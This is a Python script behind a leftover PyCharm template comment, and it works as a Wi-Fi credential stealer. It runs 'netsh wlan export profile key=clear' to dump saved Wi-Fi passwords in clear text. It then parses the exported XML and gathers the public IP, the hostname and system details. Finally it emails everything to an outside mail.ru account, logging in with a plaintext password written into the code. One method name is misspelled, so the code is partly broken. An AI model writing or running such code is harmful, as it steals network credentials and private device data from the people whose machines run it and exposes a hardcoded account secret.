# # This is a sample Python script.
#
# # Press Shift+F10 to execute it or replace it with your code.
# # Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
#
#
# def print_hi(name):
#     # Use a breakpoint in the code line below to debug your script.
#     print(f'Hi, {name}')  # Press Ctrl+F8 to toggle the breakpoint.
#
#
# # Press the green button in the gutter to run the script.
# if __name__ == '__main__':
#     print_hi('PyCharm')
#
# # See PyCharm help at https://www.jetbrains.com/help/pycharm/
import subprocess as sp
from xml.dom import minidom
import requests
from time import sleep
import platform as pf
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import socket

sp.call('netsh wlan show profile')
sp.call('netsh wlan export profile folder=C:\\ key = clear')

sleep( 2 )

def wifi_parse():
    doc = minidom.parse('C:\\Беспроводная сеть-DIR-615.xml')

    wifi_name = doc.getElemetsByTagName('name')
    wifi_pass = doc.getElementsByTagName('keyMaterial')

    global date
    date = f'WI-FI name : {wifi_name}\n WI-FI password : {wifi_pass}'

def get_ip():
    response = requests.get('http://myip.dnsomatic.com')

    ip = response.text

    global date_ip
    date_ip = f'IP ADRESS : {ip}'

def info_pc():
    processor = pf.processor()
    name_sys = pf.system()+ ' ' + pf.release()
    net_pc = pf.node()
    ip_pc = socket.gethostbyname(socket.gethostname())

    global date_pc
    date_pc = f'''
    Проц : {processor}\n 
    Система: {name_sys}\n
    Сетевое имя:{net_pc}\n
    IP PC: {ip_pc}\n
    '''

def all_info():
    global date_all_info
    date_all_info = f'{date}\n{date_ip}\n{date_pc}'

def send_mail():
    msg = MIMEMultipart()

    msg['Subject'] = 'Info PC'
    msg['From'] = 'svishvenkov@mail.ru'
    body = date_all_info
    msg.attach(MIMEText(body, 'plain'))

    server = smtplib.SMTP_SSL('smtp.mail.ru', 465)

    server.login('svishvenkov@mail.ru','3610256728Seriy')
    server.sendmail('info@mail.ru', 'svishvenkov@mail.ru', msg.as_string())
    server.quit()


def main():
    wifi_parse()
    get_ip()
    info_pc()
    all_info()
    send_mail()

main()